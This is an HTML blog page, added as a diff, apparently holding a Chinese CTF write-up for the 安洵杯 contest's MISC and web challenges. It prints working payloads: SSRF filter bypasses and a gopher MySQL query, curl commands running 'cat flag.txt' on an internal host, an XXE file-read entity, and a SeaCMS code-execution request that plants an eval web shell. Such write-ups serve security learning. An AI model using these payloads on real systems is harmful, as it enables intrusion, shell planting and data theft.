@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="two_smi1e">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="two_smi1e">
+    <meta name="keywords" content="Two_smi1e | two_smi1e">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>安洵杯writewp · Twosmi1e&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Twosmi1e&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">安洵杯writewp</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Twosmi1e's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            安洵杯writewp
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">2,919</span> / Reading time: <span class="post-count">15 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/26</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="CRC"><a href="#CRC" class="headerlink" title="CRC"></a>CRC</h3><p>第一个压缩包，提示CRC爆破结果是纯数字，直接爆破<br>里面三个文件，看了一下大概是要先解压password然后运行.py计算flag.zip的解压密码。<br>然后crc32碰撞，直接爆破password.txt的内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100000000</span>):</span><br><span class="line">	buf = str(i).rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">	<span class="comment">#print buf</span></span><br><span class="line">    <span class="keyword">if</span> zlib.crc32(buf) &amp; <span class="number">0xffffffff</span> == <span class="number">0x0cd95dac</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">''</span>,buf</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/26/安洵杯writewp/1543154531102.png" alt="Alt text"><br>然后再用.py跑<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment">#f = open("password.txt",'r')</span></span><br><span class="line"><span class="comment">#password = f.readline()</span></span><br><span class="line">password=<span class="string">'08646247'</span></span><br><span class="line">b64_str = base64.b64encode(password.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.update(b64_str)</span><br><span class="line">zip_passowrd = hash.hexdigest()</span><br><span class="line">print(zip_passowrd)</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/26/安洵杯writewp/1543154965351.png" alt="Alt text"><br>再去解压flag.zip,解压出来一张图片<br>改高度，先直接winhex改了过后图片直接崩了，然后绕了一会，结果就是该高度，winhex不对应该是crc的原因。<br><img src="/2018/11/26/安洵杯writewp/1543155653161.png" alt="Alt text"><br>修改高度为500<br><img src="/2018/11/26/安洵杯writewp/1543155673584.png" alt="Alt text"><br>可以看到flag了导出 提取文字完事。<br><img src="/2018/11/26/安洵杯writewp/1543155715575.png" alt="Alt text"></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>提示输入NOHO<br>测出来要求在7399999999到7400000000<br><a href="http://222.18.158.227:10580/?NOHO[]=d" target="_blank" rel="external">http://222.18.158.227:10580/?NOHO[]=d</a>  数组绕过<br><img src="/2018/11/26/安洵杯writewp/1543026226298.png" alt="Alt text"><br>输密码<br><code>&lt;!--SELECT master FROM secret WHERE password = binary &#39;c���{��Pykd��HE&#39;--&gt;</code><br>发现是MD5加密后16进制转字符<br><img src="/2018/11/26/安洵杯writewp/1543150100581.png" alt="Alt text"><br>MD5注入<br>ffifdyop<br><img src="/2018/11/26/安洵杯writewp/1543150034193.png" alt="Alt text"></p>
+<h3 id="蒙古-Diglett"><a href="#蒙古-Diglett" class="headerlink" title="蒙古 Diglett"></a>蒙古 Diglett</h3><p>ssrf<br><a href="http://54.200.169.99:7001/index.php?hu3debug=1" target="_blank" rel="external">http://54.200.169.99:7001/index.php?hu3debug=1</a> 找到源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include_once &quot;config.php&quot;;</span><br><span class="line">    if (isset($_POST[&apos;url&apos;])&amp;&amp;!empty($_POST[&apos;url&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $url = $_POST[&apos;url&apos;];</span><br><span class="line">        if(preg_match(&apos;/file/&apos;,$url))</span><br><span class="line">        &#123;</span><br><span class="line">             echo &quot;No hacker!&quot;;</span><br><span class="line">             echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $url2 = preg_replace(&apos;/file/&apos;,&apos;&apos;,$url);</span><br><span class="line">        $content_url = getUrlContent($url2);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $content_url = &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($_GET[&apos;hu3debug&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>过滤了file尝试双写绕过<br>读配置文件<br>url=fifilele://localhost/var/www/config.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$hosts = &quot;localhost&quot;;</span><br><span class="line">$dbusername = &quot;test_user&quot;;</span><br><span class="line">$dbpasswd = &quot;&quot;;</span><br><span class="line">$dbname = &quot;test&quot;;</span><br><span class="line">$dbport = 3306;</span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line">function initdb($conn)</span><br><span class="line">&#123;</span><br><span class="line">	$dbinit = &quot;create table if not exists flag(secret varchar(100));&quot;;</span><br><span class="line">	if(mysqli_query($conn,$dbinit)) return 1;</span><br><span class="line">	else return 0;</span><br><span class="line">&#125;</span><br><span class="line">function safe($url)</span><br><span class="line">&#123;</span><br><span class="line">	$tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line">	if($tmpurl != &quot;localhost&quot; and $tmpurl != &quot;127.0.0.1&quot;)</span><br><span class="line">	&#123;</span><br><span class="line">		var_dump($tmpurl);</span><br><span class="line">		die(&quot;&lt;h1&gt;&lt;p id=&apos;test1&apos;&gt;You are not the local!&lt;/p&gt;&lt;/h1&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return $url;</span><br><span class="line">&#125;</span><br><span class="line">function getUrlContent($url)&#123;</span><br><span class="line">	$url = safe($url);</span><br><span class="line">	$url = escapeshellarg($url);</span><br><span class="line">	$pl = &quot;curl &quot;.$url;</span><br><span class="line">	echo $pl;</span><br><span class="line">	$content = shell_exec($pl);</span><br><span class="line">	return $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>知道了mysql的配置内容 gopher一波<br><img src="/2018/11/26/安洵杯writewp/1543075424002.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%74%65%73%74%2e%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/26/安洵杯writewp/1543207604363.png" alt="Alt text"></p>
+<p>D0g3{G0ph1er_4nd_55rf_1s_1nt3rest1ng!}</p>
+<h3 id="BOOM-web"><a href="#BOOM-web" class="headerlink" title="BOOM web"></a>BOOM web</h3><p>御剑扫目录<br>后台登录地址：<a href="http://222.18.158.227:10080/admin/login.html" target="_blank" rel="external">http://222.18.158.227:10080/admin/login.html</a><br>题目是boom就直接爆破吧，看题目描述应该是绕过这个验证码，刷新数字变大，估计是时间戳生成。<br><img src="/2018/11/26/安洵杯writewp/1543158391091.png" alt="Alt text"><br>但是测了一下可以直接空等于空绕过，然后直接intruder爆破<br>爆了很久的弱口令 结果是纯数字 很坑。<br><img src="/2018/11/26/安洵杯writewp/1543158721467.png" alt="Alt text"><br>登录拿flag<img src="/2018/11/26/安洵杯writewp/1543158778138.png" alt="Alt text"><br>70e052657cb40cf142883abaff266fee</p>
+<h3 id="中国-webN"><a href="#中国-webN" class="headerlink" title="中国 webN"></a>中国 webN</h3><p><img src="/2018/11/26/安洵杯writewp/1543206219303.png" alt="Alt text"><br>首页一个SRC界面，没什么用<br>点礼品中心<a href="http://222.18.158.245:6080/reward.php点击购买" target="_blank" rel="external">http://222.18.158.245:6080/reward.php点击购买</a><br><img src="/2018/11/26/安洵杯writewp/1543206407046.png" alt="Alt text"><br>发现用户可控jsonp<br><img src="/2018/11/26/安洵杯writewp/1543206721265.png" alt="Alt text"><br>看提示some攻击，翻文章<br><a href="https://paper.tuisec.win/detail/05c9c8b3e28bd2b" target="_blank" rel="external">https://paper.tuisec.win/detail/05c9c8b3e28bd2b</a><br><a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/169873.html</a><br>然后还提示联系客服，思路大概就是构造exp放vps上，发客服让机器人访问，子页面通过可控jsonp对父页面操作<br><img src="/2018/11/26/安洵杯writewp/1543159598524.png" alt="Alt text"><br>查日志发现flag<br><img src="/2018/11/26/安洵杯writewp/1543159548320.png" alt="Alt text"></p>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>题目提示Find The d0g3.php In Intranets<br><img src="/2018/11/26/安洵杯writewp/1543215290607.png" alt="Alt text"><br>在name提交框那里随便提交一个test，发现输出到了url的url参数<br><a href="http://222.18.158.227:10180/?url=test#" target="_blank" rel="external">http://222.18.158.227:10180/?url=test#</a><br>思路大概就有了，ssrf扫内网，访问d0g3.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://222.18.158.227:10180/?url=http%3A%2F%2F10.10.1.0-255&apos;</span><br></pre></td></tr></table></figure>
+<p>扫一遍发现有<code>10.10.1.3</code>和<code>10.10.1.6</code>两台主机，利用同样的方法扫描端口，发现只有80端口，并且只有<code>10.10.1.6</code>主机才有d0g3.php，访问<code>10.10.1.6/d0g3.php</code>提示<br><code>curl -v &#39;http://222.18.158.227:10180/?url=http%3A%2F%2F10.10.1.6%2Fd0g3.php&#39;</code><br><img src="/2018/11/26/安洵杯writewp/1543215732496.png" alt="Alt text"></p>
+<p>传入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo();&apos;</span><br></pre></td></tr></table></figure>
+<p>发现执行了命令</p>
+<p>于是读取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo `cat flag.txt`; &apos;</span><br></pre></td></tr></table></figure>
+<p>拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;SSRF_Is_So_Easy&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="only-d0g3er-can-see-flag"><a href="#only-d0g3er-can-see-flag" class="headerlink" title="only d0g3er can see flag"></a>only d0g3er can see flag</h3><p>查找poc getshell<br><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="external">https://www.freebuf.com/vuls/150042.html</a></p>
+<p><a href="http://138.68.2.14/seacms/search.php" target="_blank" rel="external">http://138.68.2.14/seacms/search.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;&amp;9[]=phpinfo();</span><br></pre></td></tr></table></figure></p>
+<p>那就写shell吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=file_put_contents(&apos;../shell.php&apos;,&apos;&lt;?php%20@eval($_POST[123])?&gt;&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>提示.git泄露，用工具读出源码吧<br>\data\ common.inc.php有配置信息</p>
+<p>直接写sql语句读取flag</p>
+<p><a href="http://138.68.2.14/seacms/search.php" target="_blank" rel="external">http://138.68.2.14/seacms/search.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=$con =mysql_connect(&quot;localhost&quot;,&quot;d0g3&quot;,&quot;FlagIsHere&quot;);</span><br><span class="line">mysql_select_db(&quot;flag&quot;, $con);</span><br><span class="line">$result = mysql_query(&quot;SELECT * from flag&quot;);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">var_dump($row);</span><br></pre></td></tr></table></figure></p>
+<p>RDBnM3tUaGlzX2lzX3JlYWxfZmxhZ30=<br>Base64解码：D0g3{This_is_real_flag}</p>
+<h3 id="Magic-Mirror"><a href="#Magic-Mirror" class="headerlink" title="Magic Mirror"></a>Magic Mirror</h3><p>思路是在忘记密码处，填入管理员账户<code>admin</code>，重置管理员账号密码，然后登录管理员账号。</p>
+<p>但是重置时会发送重置邮件，根据官方的提示，抓包将host改为vps地址，然后在vbs上开启一个web服务，目标主机就会带着重置token去访问我们的vps，然后我们利用这个token访问密码重置页面就能重置admin密码了</p>
+<p>登录后还有一个输入框，任意提交一个字符串后抓包发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt;</span><br></pre></td></tr></table></figure>
+<p>xxe无误，直接读取文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY myentity SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">information</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;myentity;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;/<span class="name">information</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>外部实体注入  Filter协议读文件  记得base6<br>拿到flag.php的base64编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CmVjaG8gIjxjZW50ZXI+PGZvbnQgc2l6ZT0nNScgY29sb3I9J3JlZCc+IjsKZWNobyAiWW91IHdhbm5hIGNhcHR1cmUgdGhpcyBmbGFnPyI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiT2ggeWVzLCBoZXJlISI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiQnV0IG5vdywgIjsKZWNobyAiPGJyPjxicj4iOwplY2hvICJHZXQgb3V0ISI7CmVjaG8gIjwvZm9udD48L2NlbnRlcj4iOwovL2ZsYWc6IEQwZzN7SGlfRDBnM19SZXMzdF80bmRfeFhlfQoKCj8+Cg==</span><br></pre></td></tr></table></figure>
